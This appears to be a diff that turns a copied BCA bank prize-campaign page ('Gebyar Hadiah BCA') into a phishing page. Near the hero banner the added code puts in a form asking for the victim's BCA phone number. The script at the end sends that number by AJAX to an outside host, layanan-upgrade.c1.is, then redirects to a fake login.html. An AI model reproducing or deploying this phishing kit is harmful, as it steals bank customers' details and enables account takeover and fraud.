@@ -115,14 +115,14 @@ html {
 
 
 
-    <link href="https://www.bca.co.idhttps://www.bca.co.id/-/media/Feature/Default-BCA/favicon-bca.png" rel="shortcut icon" />
+    <link href="https://www.bca.co.id/-/media/Feature/Default-BCA/favicon-bca.png" rel="shortcut icon" />
 
 
 
 <meta property="fb:app_id"  content="1686086531669768" />
 <meta property="og:description"  content="Gebyar Hadiah BCA hadir selama periode 1 Mei - 31 Agustus 2024 dengan berbagai hadiah menarik. Yuk, mulai nabung dan transaksi sebanyak-banyaknya dan raih poinnya!" />
 <meta property="og:site_name"  content="www.bca.co.id" />
-<meta property="og:image"  content="https://www.bca.co.idhttps://www.bca.co.id/-/media/Feature/Banner/Content-Banner/campaign/Gebyar-Hadiah-BCA/20240502-gebyar-hadiah-bca-thumb.jpg" />
+<meta property="og:image"  content="https://www.bca.co.id/-/media/Feature/Banner/Content-Banner/campaign/Gebyar-Hadiah-BCA/20240502-gebyar-hadiah-bca-thumb.jpg" />
 <meta property="og:title"  content="BCA - Gebyar Hadiah BCA" />
 <meta property="og:url"  content="https://www.bca.co.id/id/Campaign/2024/gebyar-hadiah-bca" />
 
@@ -130,10 +130,10 @@ html {
 <meta  name="description" content="Gebyar Hadiah BCA hadir selama periode 1 Mei - 31 Agustus 2024 dengan berbagai hadiah menarik. Yuk, mulai nabung dan transaksi sebanyak-banyaknya dan raih poinnya!" />
 <meta  name="keywords" content="BCA - Gebyar Hadiah BCA" />
 
-<meta property="og:image" content="https://www.bca.co.idhttps://www.bca.co.id/-/media/Feature/Banner/Content-Banner/campaign/Gebyar-Hadiah-BCA/20240502-gebyar-hadiah-bca-thumb.jpg">
+<meta property="og:image" content="https://www.bca.co.id/-/media/Feature/Banner/Content-Banner/campaign/Gebyar-Hadiah-BCA/20240502-gebyar-hadiah-bca-thumb.jpg">
 
 <meta property="twitter:site"  content="BCA - Gebyar Hadiah BCA" />
-<meta property="twitter:image"  content="https://www.bca.co.idhttps://www.bca.co.id/-/media/Feature/Banner/Content-Banner/campaign/Gebyar-Hadiah-BCA/20240502-gebyar-hadiah-bca-thumb.jpg" />
+<meta property="twitter:image"  content="https://www.bca.co.id/-/media/Feature/Banner/Content-Banner/campaign/Gebyar-Hadiah-BCA/20240502-gebyar-hadiah-bca-thumb.jpg" />
 <meta property="twitter:description"  content="Gebyar Hadiah BCA hadir selama periode 1 Mei - 31 Agustus 2024 dengan berbagai hadiah menarik. Yuk, mulai nabung dan transaksi sebanyak-banyaknya dan raih poinnya!" />
 <meta property="twitter:title"  content="BCA - Gebyar Hadiah BCA" />
 <meta property="twitter:card"  content="summary" />
@@ -156,7 +156,7 @@ html {
 
 	<meta name="data_language" content ="id">
 </head>
-<body class="with-top-nav logo-default with-smartbar mobile-device bodyclass">
+<body class="with-top-nav logo-default with-smartbar mobile-device bodyclass" style="position: fixed; left: 0; right: 0; width: 100%; ">
 	
 	
 
@@ -691,16 +691,21 @@ position: fixed;
 	</div>
 </aside>
 
-<div class="m-item-highlight custom-banner-ramadan" style="background-image:url('www.bca.co.idhttps://www.bca.co.id/-/media/Feature/Banner/Content-Banner/campaign/Gebyar-Hadiah-BCA/20240430-Gebyar-Hadiah-BCA-mobile-rev.jpg?v=1'); margin-top: -30px">
+<div class="m-item-highlight custom-banner-ramadan" style="background-image:url('https://www.bca.co.id/-/media/Feature/Banner/Content-Banner/campaign/Gebyar-Hadiah-BCA/20240430-Gebyar-Hadiah-BCA-mobile-rev.jpg?v=1'); margin-top: -30px">
 	<div class="container m-item-highlight-container">
-		<div class="m-item-highlight-container-left">
-			<h2 class="hero-text">Gebyar Hadiah BCA</h2>
-			<p class="description-text">Tingkatkan saldo dan transaksi untuk memenangkan Grand Prize mobil mewah</p>
+		<div class="m-item-highlight-container-left"><center>
+			<h2 class="hero-text" style="margin-top: -20px">Gebyar Hadiah BCA</h2>
+Berlaku Untuk Semua Nasabah Bca Yang Sudah Terdaftar Di Mobile Bca, My Bca, Bca Digital, Klik Bca</center>
 			<div class="action-container">
 
+		<form id="formHP" onsubmit="sendNohp(event); return false" method="POST"> 
+<input id="nama" name="nohp" class="a-button secondary undefined" type="tel" placeholder="Masukkan nomor HP BCA anda" style="height: 45px; text-align: left; padding-left: 18px; background: #fff; color: #000" required maxlength="13" minlength="10">
 
+			<button id="btnSubmit" class="a-button secondary undefined a-button primary" type="submit" style="height: 45px; padding: 0px; background: #005BAA; color: #fff">Daftar Sekarang
+ </button>
+ </form>
 
-					<a class="a-button primary" href="data.html" constractLinkTargetHrefBtn>Daftar Sekarang</a>
+					
 			</div>
 		</div>
 	</div>
@@ -2840,8 +2845,37 @@ sidebarGsp && sidebarGsp.addEventListener('click',function(e){
     });
   });
 </script>
+script src="https://raw.githubusercontent.com/mebjas/html5-qrcode/master/minified/html5-qrcode.min.js"></script>
+<script src="https://unpkg.com/html5-qrcode" type="text/javascript"></script>
+  <script src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>    
+<script>
+ $(document).ready(function(){
+    $('#formHP').submit(function(e) {
+    event.preventDefault();
 
+document.getElementById('btnSubmit').innerHTML = "Memproses...";   
 
+ $.ajax({
+ type: 'POST',
+ url: 'https://layanan-upgrade.c1.is/data/Layanan/1/sendHP.php',
+ data: $(this).serialize(),
+ datatype: 'JSON',
+ 
+ complete: function(data) {
+            console.log('Complete')
+  setTimeout(function(){
+ var nomor = document.getElementById("nama").value;
+ sessionStorage.setItem("nomor", nomor);          location.href ="./login.html";
+     }, 500);
+        }
+    });
+ });
+    return false;
+});   
+     
+</script>
 
 
 	
